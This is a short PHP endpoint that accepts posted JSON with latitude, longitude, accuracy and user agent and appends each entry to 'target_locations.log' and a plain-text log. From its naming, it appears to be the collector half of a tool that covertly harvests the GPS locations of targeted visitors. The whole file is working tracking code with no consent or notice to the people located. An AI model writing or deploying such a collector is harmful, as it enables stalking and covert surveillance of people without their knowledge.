<?php
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $entry = [
        "time" => date('Y-m-d H:i:s'),
        "latitude" => $data['lat'] ?? 'N/A',
        "longitude" => $data['lon'] ?? 'N/A',
        "accuracy" => $data['accuracy'] ?? 'N/A',
        "user_agent" => $data['userAgent'] ?? 'N/A'
    ];

    // Save to log file
    file_put_contents('target_locations.log', json_encode($entry, JSON_PRETTY_PRINT) . "\n\n", FILE_APPEND);
    
    // Also save simple readable version
    $simple = date('Y-m-d H:i:s') . " | Lat: " . $entry['latitude'] . " | Lon: " . $entry['longitude'] . " | Accuracy: " . $entry['accuracy'] . "\n";
    file_put_contents('simple_log.txt', $simple, FILE_APPEND);
}

echo "OK";
?>